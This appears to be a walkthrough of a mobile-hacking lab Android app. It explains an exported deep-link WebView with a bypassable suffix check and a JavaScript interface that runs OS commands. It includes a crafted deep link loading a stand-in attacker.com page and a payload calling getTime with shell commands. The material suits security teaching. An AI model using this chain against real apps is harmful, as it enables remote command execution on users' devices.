
---

### ✦ Vulnerability Analysis

The `WebviewActivity` is exported and configured with a deep link handler using the custom URI scheme `mhl://mobilehackinglab`. This makes the activity **publicly accessible** by any external app or browser.

```xml
<activity
    android:name="com.mobilehackinglab.guessme.WebviewActivity"
    android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW"/>
        <category android:name="android.intent.category.DEFAULT"/>
        <category android:name="android.intent.category.BROWSABLE"/>
        <data
            android:scheme="mhl"
            android:host="mobilehackinglab"/>
    </intent-filter>
</activity>
```

---

### ✦ Deep Link Handling

When the activity is opened via a deep link, it calls `handleDeepLink()`, which validates the URL using `isValidDeepLink()`, and if valid, it loads the URL inside a WebView.

```java
private final void handleDeepLink(Intent intent) {
    Uri uri = intent != null ? intent.getData() : null;
    if (uri != null) {
        if (isValidDeepLink(uri)) {
            loadDeepLink(uri);
        } else {
            loadAssetIndex();
        }
    }
}
```

---

### ✦ Weak Validation (Bypassable)

The `isValidDeepLink()` method only checks:

✔ Scheme must be `mhl://` or `https://`
✔ Host must be `mobilehackinglab`
✔ `url` parameter must **end with** `mobilehackinglab.com`

```java
private final boolean isValidDeepLink(Uri uri) {
    if ((!Intrinsics.areEqual(uri.getScheme(), "mhl") && !Intrinsics.areEqual(uri.getScheme(), "https")) || 
        !Intrinsics.areEqual(uri.getHost(), "mobilehackinglab")) {
        return false;
    }
    String queryParameter = uri.getQueryParameter("url");
    return queryParameter != null && 
           StringsKt.endsWith$default(queryParameter, "mobilehackinglab.com", false, 2, null);
}
```

🔴 This check is weak — it only validates the **suffix**, meaning a malicious URL like:

```
https://attacker.com/mobilehackinglab.com
```

will be **accepted and loaded inside WebView**, allowing attacker-controlled JavaScript execution (XSS / JS Interface Abuse).

---


Inside the app, there is a dangerous method:

```java
        public final String getTime(String Time) throws IOException {
            Intrinsics.checkNotNullParameter(Time, "Time");
            try {
                Process process = Runtime.getRuntime().exec(Time);
                InputStream inputStream = process.getInputStream();
                Intrinsics.checkNotNullExpressionValue(inputStream, "getInputStream(...)");
                Reader inputStreamReader = new InputStreamReader(inputStream, Charsets.UTF_8);
                BufferedReader reader = inputStreamReader instanceof BufferedReader ? (BufferedReader) inputStreamReader : new BufferedReader(inputStreamReader, 8192);
                String text = TextStreamsKt.readText(reader);
                reader.close();
                return text;
            } catch (Exception e) {
                return "Error getting time";
            }
```

💥 This method executes **user‑controlled commands directly on the OS**, resulting in **Full Remote Code Execution (RCE)**.

---

### ✦ Attack Chain

1️⃣ Attacker crafts deep link to inject external malicious page inside WebView:

```
mhl://mobilehackinglab?url=https://attacker.com/mobilehackinglab.com
```

2️⃣ Malicious page loaded inside WebView runs JavaScript.

3️⃣ JavaScript calls the exposed `getTime()` interface, passing OS commands.

4️⃣ App executes attacker commands → **RCE achieved**.

---

### ✦ Final Exploit Idea

📌 Using JavaScript inside WebView:

```javascript
javascript:Android.getTime("ls; id; uname -a");
```


تحب أعمله؟
